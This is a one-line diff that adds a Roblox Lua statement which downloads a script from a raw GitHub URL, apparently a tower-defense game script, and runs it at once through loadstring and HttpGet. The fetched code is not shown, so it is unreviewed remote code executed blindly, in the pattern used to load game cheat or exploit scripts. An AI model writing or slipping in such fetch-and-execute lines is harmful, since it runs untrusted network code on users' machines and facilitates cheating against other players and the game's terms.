@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/huliarkom/script/main/towerdef123x'))()
